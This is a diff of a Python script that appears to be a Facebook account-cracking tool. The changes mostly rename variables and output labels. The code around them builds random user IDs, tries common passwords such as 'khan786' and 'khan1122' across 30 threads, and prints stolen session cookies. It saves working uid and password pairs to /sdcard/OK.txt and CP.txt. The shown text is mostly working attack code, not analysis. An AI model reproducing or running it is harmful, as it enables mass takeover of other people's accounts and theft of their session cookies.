+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1730,7 +1699,7 @@ def awm25():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1739,10 +1708,10 @@ def awm25():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'khan khan']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'khan khan']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1770,7 +1739,7 @@ def awm26():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1779,10 +1748,10 @@ def awm26():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'khan1122']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'khan1122']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1810,7 +1779,7 @@ def awm27():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as manshera:    
+    with ThreadPool(max_workers=30) as danishyar:    
         clear()
         tl = str(len(user))
         print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
@@ -1819,10 +1788,10 @@ def awm27():
         print('\033[1;32m--------------------------------------------------------------') 
         print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
         print('\033[1;32m--------------------------------------------------------------') 
-        for love in user:
-            uid = code+love
-            pwx = [love,'khan786']
-            manshera.submit(freeq,uid,pwx,tl)
+        for wordtech in user:
+            uid = code+wordtech
+            pwx = [wordtech,'khan786']
+            danishyar.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
     print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
@@ -1903,14 +1872,14 @@ def freeq(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
-                print(f'\r\33[1;97m[\033[1;96mB-T-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m')
+                print(f'\r\33[1;97m[\033[1;96mAWM-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[141:156]
-                    print(f'\r\33[1;97m[\033[1;90mCheckpoint-B-T\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
+                    print(f'\r\33[1;97m[\033[1;90mAWM-CP\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                     open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
